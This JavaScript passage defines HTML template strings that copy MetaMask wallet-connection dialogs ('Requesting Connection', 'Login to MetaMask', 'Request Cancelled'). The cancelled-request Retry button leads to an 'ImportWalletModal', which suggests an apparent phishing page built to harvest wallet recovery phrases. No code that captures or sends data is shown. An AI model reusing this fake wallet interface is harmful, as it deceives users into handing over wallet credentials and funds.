                                                        <path d="M17.8258 23.2096L17.3546 22.8857H14.6357L14.1646 23.2096L13.9191 25.379L14.1449 25.163H17.8454L18.0907 25.379L17.8258 23.2096Z" fill="var(--ck-brand-metamask-04)" stroke="var(--ck-brand-metamask-04)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M27.6806 11.7552L28.5149 7.75041L27.2683 4.03027L17.8257 11.0387L21.4575 14.1109L26.591 15.6128L27.7296 14.2876L27.2389 13.9342L28.0241 13.2178L27.4156 12.7465L28.2007 12.1478L27.6806 11.7552Z" fill="var(--ck-brand-metamask-05)" stroke="var(--ck-brand-metamask-05)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M3.48486 7.75041L4.3192 11.7552L3.78916 12.1478L4.57441 12.7465L3.97566 13.2178L4.7609 13.9342L4.27012 14.2876L5.39892 15.6128L10.5325 14.1109L14.1644 11.0387L4.72164 4.03027L3.48486 7.75041Z" fill="var(--ck-brand-metamask-05)" stroke="var(--ck-brand-metamask-05)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M26.591 15.6122L21.4575 14.1104L23.0181 16.4564L20.6919 20.9716L23.7544 20.9323H28.3186L26.591 15.6122Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.5326 14.1104L5.39897 15.6122L3.69104 20.9323H8.24551L11.2982 20.9716L8.98168 16.4564L10.5326 14.1104Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M17.5018 16.7018L17.8258 11.0381L19.3177 7.00391H12.6921L14.1645 11.0381L14.5081 16.7018L14.6258 18.4883L14.6356 22.8856H17.3546L17.3742 18.4883L17.5018 16.7018Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                    </svg>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq">
                                                <div class="sc-HzFiz dYEcPx" style="opacity: 1;">
                                                    <svg aria-hidden="true" width="102" height="102" viewBox="0 0 102 102" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path d="M52 100C24.3858 100 2 77.6142 2 50" stroke="url(#paint0_linear_1943_4139)" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <defs>
                                                            <linearGradient id="paint0_linear_1943_4139" x1="2" y1="48.5" x2="53" y2="100" gradientUnits="userSpaceOnUse">
                                                                <stop stop-color="var(--ck-spinner-color)"></stop>
                                                                <stop offset="1" stop-color="var(--ck-spinner-color)" stop-opacity="0"></stop>
                                                            </linearGradient>
                                                        </defs>
                                                    </svg>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">
                                        <div style="padding-bottom: 28px;" class="sc-iBkjds emnDjo">
                                            <h1 class="sc-ftvSup fqLYro">Requesting Connection<br></h1>
                                            <div class="sc-papXJ jCcNJP">Open the MetaMask browser <br>extension to connect your wallet.<br></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;
const MetamaskLoginModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 351px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">MetaMask</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe">
                                                <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                    <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path d="M27.2684 4.03027L17.5018 11.2841L19.3079 7.00442L27.2684 4.03027Z" fill="var(--ck-brand-metamask-02)" stroke="var(--ck-brand-metamask-02)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M4.7218 4.03027L14.4099 11.3528L12.6921 7.00442L4.7218 4.03027Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M23.7544 20.8438L21.1532 24.8289L26.7187 26.3602L28.3187 20.9321L23.7544 20.8438Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M3.69104 20.9321L5.28117 26.3602L10.8467 24.8289L8.24551 20.8438L3.69104 20.9321Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.5327 14.1108L8.98181 16.4568L14.5081 16.7022L14.3117 10.7637L10.5327 14.1108Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M21.4576 14.1111L17.6295 10.6953L17.5018 16.7025L23.0182 16.4571L21.4576 14.1111Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.8469 24.8292L14.1647 23.2096L11.2984 20.9717L10.8469 24.8292Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M17.8257 23.2096L21.1531 24.8292L20.6918 20.9717L17.8257 23.2096Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M21.1531 24.8296L17.8257 23.21L18.0906 25.3793L18.0612 26.2921L21.1531 24.8296Z" fill="var(--ck-brand-metamask-06)" stroke="var(--ck-brand-metamask-06)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.8469 24.8296L13.9388 26.2921L13.9192 25.3793L14.1647 23.21L10.8469 24.8296Z" fill="var(--ck-brand-metamask-06)" stroke="var(--ck-brand-metamask-06)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M13.9877 19.5389L11.2196 18.7242L13.1729 17.8311L13.9877 19.5389Z" fill="var(--ck-brand-metamask-09)" stroke="var(--ck-brand-metamask-09)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M18.0023 19.5389L18.8171 17.8311L20.7802 18.7242L18.0023 19.5389Z" fill="var(--ck-brand-metamask-09)" stroke="var(--ck-brand-metamask-09)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.8468 24.8289L11.3179 20.8438L8.24561 20.9321L10.8468 24.8289Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M20.6821 20.8438L21.1532 24.8289L23.7544 20.9321L20.6821 20.8438Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M23.0182 16.4565L17.5018 16.7019L18.0122 19.5387L18.827 17.8308L20.7902 18.7239L23.0182 16.4565Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M11.2198 18.7239L13.1829 17.8308L13.9878 19.5387L14.5081 16.7019L8.98181 16.4565L11.2198 18.7239Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M8.98181 16.4565L11.2983 20.9718L11.2198 18.7239L8.98181 16.4565Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M20.7901 18.7239L20.6919 20.9718L23.0181 16.4565L20.7901 18.7239Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M14.508 16.7021L13.9878 19.5389L14.6356 22.886L14.7828 18.4788L14.508 16.7021Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M17.5017 16.7021L17.2367 18.4689L17.3545 22.886L18.0121 19.5389L17.5017 16.7021Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M18.0121 19.5388L17.3545 22.886L17.8257 23.2099L20.6918 20.972L20.79 18.7241L18.0121 19.5388Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M11.2196 18.7241L11.2981 20.972L14.1644 23.2099L14.6355 22.886L13.9877 19.5388L11.2196 18.7241Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M18.0615 26.2917L18.0908 25.3788L17.8455 25.1628H14.145L13.9192 25.3788L13.9388 26.2917L10.8469 24.8291L11.9267 25.7126L14.1155 27.234H17.875L20.0736 25.7126L21.1533 24.8291L18.0615 26.2917Z" fill="var(--ck-brand-metamask-07)" stroke="var(--ck-brand-metamask-07)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M17.8258 23.2096L17.3546 22.8857H14.6357L14.1646 23.2096L13.9191 25.379L14.1449 25.163H17.8454L18.0907 25.379L17.8258 23.2096Z" fill="var(--ck-brand-metamask-04)" stroke="var(--ck-brand-metamask-04)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M27.6806 11.7552L28.5149 7.75041L27.2683 4.03027L17.8257 11.0387L21.4575 14.1109L26.591 15.6128L27.7296 14.2876L27.2389 13.9342L28.0241 13.2178L27.4156 12.7465L28.2007 12.1478L27.6806 11.7552Z" fill="var(--ck-brand-metamask-05)" stroke="var(--ck-brand-metamask-05)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M3.48486 7.75041L4.3192 11.7552L3.78916 12.1478L4.57441 12.7465L3.97566 13.2178L4.7609 13.9342L4.27012 14.2876L5.39892 15.6128L10.5325 14.1109L14.1644 11.0387L4.72164 4.03027L3.48486 7.75041Z" fill="var(--ck-brand-metamask-05)" stroke="var(--ck-brand-metamask-05)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M26.591 15.6122L21.4575 14.1104L23.0181 16.4564L20.6919 20.9716L23.7544 20.9323H28.3186L26.591 15.6122Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.5326 14.1104L5.39897 15.6122L3.69104 20.9323H8.24551L11.2982 20.9716L8.98168 16.4564L10.5326 14.1104Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M17.5018 16.7018L17.8258 11.0381L19.3177 7.00391H12.6921L14.1645 11.0381L14.5081 16.7018L14.6258 18.4883L14.6356 22.8856H17.3546L17.3742 18.4883L17.5018 16.7018Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                    </svg>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo">
                                            <h1 class="sc-ftvSup fqLYro">Login to MetaMask<br></h1>
                                            <div class="sc-papXJ jCcNJP">To continue, please login to your MetaMask extension.<br></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;

const MetamaskRejectedModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 351px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">MetaMask</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd bxwbBD">
                                        <button onclick="updatePage(ImportWalletModal)" aria-label="Retry" class="sc-eKBdFk iGfDZB" style="opacity: 1; transform: none;">
                                            <div class="sc-bUbCnL ilqOAO">
                                                <div>
                                                    <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M32 16C32 24.8366 24.8366 32 16 32C7.16344 32 0 24.8366 0 16C0 7.16344 7.16344 0 16 0C24.8366 0 32 7.16344 32 16ZM24.5001 8.74263C25.0834 8.74263 25.5563 9.21551 25.5563 9.79883V14.5997C25.5563 15.183 25.0834 15.6559 24.5001 15.6559H19.6992C19.1159 15.6559 18.643 15.183 18.643 14.5997C18.643 14.0164 19.1159 13.5435 19.6992 13.5435H21.8378L20.071 11.8798C20.0632 11.8724 20.0555 11.865 20.048 11.8574C19.1061 10.915 17.8835 10.3042 16.5643 10.1171C15.2452 9.92999 13.9009 10.1767 12.7341 10.82C11.5674 11.4634 10.6413 12.4685 10.0955 13.684C9.54968 14.8994 9.41368 16.2593 9.70801 17.5588C10.0023 18.8583 10.711 20.0269 11.7273 20.8885C12.7436 21.7502 14.0124 22.2582 15.3425 22.336C16.6726 22.4138 17.9919 22.0572 19.1017 21.3199C19.5088 21.0495 19.8795 20.7333 20.2078 20.3793C20.6043 19.9515 21.2726 19.9262 21.7004 20.3228C22.1282 20.7194 22.1534 21.3876 21.7569 21.8154C21.3158 22.2912 20.8176 22.7161 20.2706 23.0795C18.7793 24.0702 17.0064 24.5493 15.2191 24.4448C13.4318 24.3402 11.7268 23.6576 10.3612 22.4998C8.9956 21.3419 8.0433 19.7716 7.6478 18.0254C7.2523 16.2793 7.43504 14.4519 8.16848 12.8186C8.90192 11.1854 10.1463 9.83471 11.7142 8.97021C13.282 8.10572 15.0884 7.77421 16.861 8.02565C18.6282 8.27631 20.2664 9.09278 21.5304 10.3525L23.4439 12.1544V9.79883C23.4439 9.21551 23.9168 8.74263 24.5001 8.74263Z" fill="currentColor"></path>
                                                    </svg>
                                                </div>
                                            </div>
                                        </button>
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe">
                                                <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                    <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path d="M27.2684 4.03027L17.5018 11.2841L19.3079 7.00442L27.2684 4.03027Z" fill="var(--ck-brand-metamask-02)" stroke="var(--ck-brand-metamask-02)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M4.7218 4.03027L14.4099 11.3528L12.6921 7.00442L4.7218 4.03027Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M23.7544 20.8438L21.1532 24.8289L26.7187 26.3602L28.3187 20.9321L23.7544 20.8438Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M3.69104 20.9321L5.28117 26.3602L10.8467 24.8289L8.24551 20.8438L3.69104 20.9321Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.5327 14.1108L8.98181 16.4568L14.5081 16.7022L14.3117 10.7637L10.5327 14.1108Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M21.4576 14.1111L17.6295 10.6953L17.5018 16.7025L23.0182 16.4571L21.4576 14.1111Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.8469 24.8292L14.1647 23.2096L11.2984 20.9717L10.8469 24.8292Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M17.8257 23.2096L21.1531 24.8292L20.6918 20.9717L17.8257 23.2096Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M21.1531 24.8296L17.8257 23.21L18.0906 25.3793L18.0612 26.2921L21.1531 24.8296Z" fill="var(--ck-brand-metamask-06)" stroke="var(--ck-brand-metamask-06)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.8469 24.8296L13.9388 26.2921L13.9192 25.3793L14.1647 23.21L10.8469 24.8296Z" fill="var(--ck-brand-metamask-06)" stroke="var(--ck-brand-metamask-06)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M13.9877 19.5389L11.2196 18.7242L13.1729 17.8311L13.9877 19.5389Z" fill="var(--ck-brand-metamask-09)" stroke="var(--ck-brand-metamask-09)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M18.0023 19.5389L18.8171 17.8311L20.7802 18.7242L18.0023 19.5389Z" fill="var(--ck-brand-metamask-09)" stroke="var(--ck-brand-metamask-09)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.8468 24.8289L11.3179 20.8438L8.24561 20.9321L10.8468 24.8289Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M20.6821 20.8438L21.1532 24.8289L23.7544 20.9321L20.6821 20.8438Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M23.0182 16.4565L17.5018 16.7019L18.0122 19.5387L18.827 17.8308L20.7902 18.7239L23.0182 16.4565Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M11.2198 18.7239L13.1829 17.8308L13.9878 19.5387L14.5081 16.7019L8.98181 16.4565L11.2198 18.7239Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M8.98181 16.4565L11.2983 20.9718L11.2198 18.7239L8.98181 16.4565Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M20.7901 18.7239L20.6919 20.9718L23.0181 16.4565L20.7901 18.7239Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M14.508 16.7021L13.9878 19.5389L14.6356 22.886L14.7828 18.4788L14.508 16.7021Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M17.5017 16.7021L17.2367 18.4689L17.3545 22.886L18.0121 19.5389L17.5017 16.7021Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M18.0121 19.5388L17.3545 22.886L17.8257 23.2099L20.6918 20.972L20.79 18.7241L18.0121 19.5388Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M11.2196 18.7241L11.2981 20.972L14.1644 23.2099L14.6355 22.886L13.9877 19.5388L11.2196 18.7241Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M18.0615 26.2917L18.0908 25.3788L17.8455 25.1628H14.145L13.9192 25.3788L13.9388 26.2917L10.8469 24.8291L11.9267 25.7126L14.1155 27.234H17.875L20.0736 25.7126L21.1533 24.8291L18.0615 26.2917Z" fill="var(--ck-brand-metamask-07)" stroke="var(--ck-brand-metamask-07)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M17.8258 23.2096L17.3546 22.8857H14.6357L14.1646 23.2096L13.9191 25.379L14.1449 25.163H17.8454L18.0907 25.379L17.8258 23.2096Z" fill="var(--ck-brand-metamask-04)" stroke="var(--ck-brand-metamask-04)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M27.6806 11.7552L28.5149 7.75041L27.2683 4.03027L17.8257 11.0387L21.4575 14.1109L26.591 15.6128L27.7296 14.2876L27.2389 13.9342L28.0241 13.2178L27.4156 12.7465L28.2007 12.1478L27.6806 11.7552Z" fill="var(--ck-brand-metamask-05)" stroke="var(--ck-brand-metamask-05)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M3.48486 7.75041L4.3192 11.7552L3.78916 12.1478L4.57441 12.7465L3.97566 13.2178L4.7609 13.9342L4.27012 14.2876L5.39892 15.6128L10.5325 14.1109L14.1644 11.0387L4.72164 4.03027L3.48486 7.75041Z" fill="var(--ck-brand-metamask-05)" stroke="var(--ck-brand-metamask-05)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M26.591 15.6122L21.4575 14.1104L23.0181 16.4564L20.6919 20.9716L23.7544 20.9323H28.3186L26.591 15.6122Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.5326 14.1104L5.39897 15.6122L3.69104 20.9323H8.24551L11.2982 20.9716L8.98168 16.4564L10.5326 14.1104Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M17.5018 16.7018L17.8258 11.0381L19.3177 7.00391H12.6921L14.1645 11.0381L14.5081 16.7018L14.6258 18.4883L14.6356 22.8856H17.3546L17.3742 18.4883L17.5018 16.7018Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                    </svg>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">
                                        <div style="padding-bottom: 28px;" class="sc-iBkjds emnDjo">
                                            <h1 class="sc-ftvSup fqLYro">Request Cancelled<br></h1>
                                            <div class="sc-papXJ jCcNJP">You cancelled the request.<br>Click above to try again.<br></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;

const MetamaskNotFoundModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 407px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">MetaMask</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe" style="border-radius: 0px;">
                                                <div style="transform: scale(1.14); position: relative; width: 100%;">
                                                    <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                        <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                            <path d="M27.2684 4.03027L17.5018 11.2841L19.3079 7.00442L27.2684 4.03027Z" fill="var(--ck-brand-metamask-02)" stroke="var(--ck-brand-metamask-02)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
